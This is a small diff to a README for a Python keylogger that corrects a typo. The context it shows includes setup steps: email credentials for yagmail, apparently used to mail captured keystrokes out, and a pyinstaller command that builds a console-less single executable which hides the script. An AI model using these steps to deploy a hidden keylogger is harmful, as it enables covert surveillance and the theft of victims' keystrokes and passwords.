@@ -29,7 +29,7 @@ Enter your email id and password here
 ```
 yagmail.SMTP(user='',password='')
 ```
-Using the pyinstaller is optioanl. Pyinstaller creates your python file into executable format (.exe in  Windows and .elf in Linux) which also makes your python file unreadable
+Using the pyinstaller is optional. Pyinstaller creates your python file into executable format (.exe in  Windows and .elf in Linux) which also makes your python file unreadable
 ```
 pyinstaller keylogger.py --no-console --onefile 
 ```
